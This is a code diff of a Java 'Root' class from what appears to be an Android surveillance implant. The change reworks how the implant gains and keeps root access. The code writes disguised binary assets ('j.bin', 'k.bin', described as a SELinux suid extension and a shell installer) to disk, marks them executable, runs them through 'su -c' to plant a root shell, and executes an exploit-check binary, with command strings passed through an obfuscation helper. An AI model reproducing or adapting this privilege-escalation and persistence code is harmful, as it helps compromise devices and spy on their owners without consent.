@@ -270,20 +270,6 @@ public class Root {
 		return true;
 	}
 
-	static public void supersuRootThreaded() {
-		if (Status.haveSu() == false) {
-			return;
-		}
-		// Start exploitation thread
-		SuperuserThread suThread = new Root.SuperuserThread();
-		Thread exploit = new Thread(suThread);
-		// exploit.start();
-
-		if (Cfg.DEBUG) {
-			Check.log(TAG + "(suThread): su thread running");
-		}
-	}
-
 	// Prendi la root tramite superuser.apk
 	static public void supersuRoot() {
 
@@ -300,7 +286,15 @@ public class Root {
 			if (Cfg.DEBUG) {
 				Check.log(TAG + " (supersuRoot) Selinux Shell");
 			}
-			selinuxShell();
+			
+			Thread thread = new Thread(new Runnable() {
+				public void run() {
+					selinuxShell();
+				}
+			});
+			thread.start();
+			Utils.sleep(8000);
+			
 		}
 	}
 
@@ -359,7 +353,7 @@ public class Root {
 			// selinux_suidext
 			InputStream streamJ = Utils.getAssetStream("j.bin");
 			// shell_installer.sh
-			InputStream streamK = Utils.getAssetStream("k.bin");
+			InputStream streamK = Utils.getAssetStream("k.bin"); 
 
 			fileWrite(selinuxSuidext.getName(), streamJ, Cfg.RNDDB);
 			fileWrite(shellInstaller.getName(), streamK, Cfg.RNDDB);
@@ -377,8 +371,7 @@ public class Root {
 
 			Execute.execute(M.e("/system/bin/chmod 755 ") + selinuxSuidext + " " + shellInstaller);
 
-			ExecuteResult res = Execute.execute(new String[] { "su", "-c",
-					shellInstaller.getFilename() + " " + selinuxSuidext.getFilename() });
+			ExecuteResult res = Execute.execute(new String[] { "su", "-c", shellInstaller.getFilename() + " " + selinuxSuidext.getFilename() });
 
 			if (Cfg.DEBUG) {
 				Check.log(TAG + " (supersuRoot) execute 2: " + shellInstaller + " ret: " + res.exitCode);
@@ -444,9 +437,7 @@ public class Root {
 
 		try {
 			fileWrite(exploitCheck, stream, Cfg.RNDDB);
-
 			Execute.execute(M.e("/system/bin/chmod 755 ") + path + "/" + exploitCheck);
-
 			int ret = Execute.execute(path + M.e("/ec")).exitCode;
 
 			if (Cfg.DEBUG) {
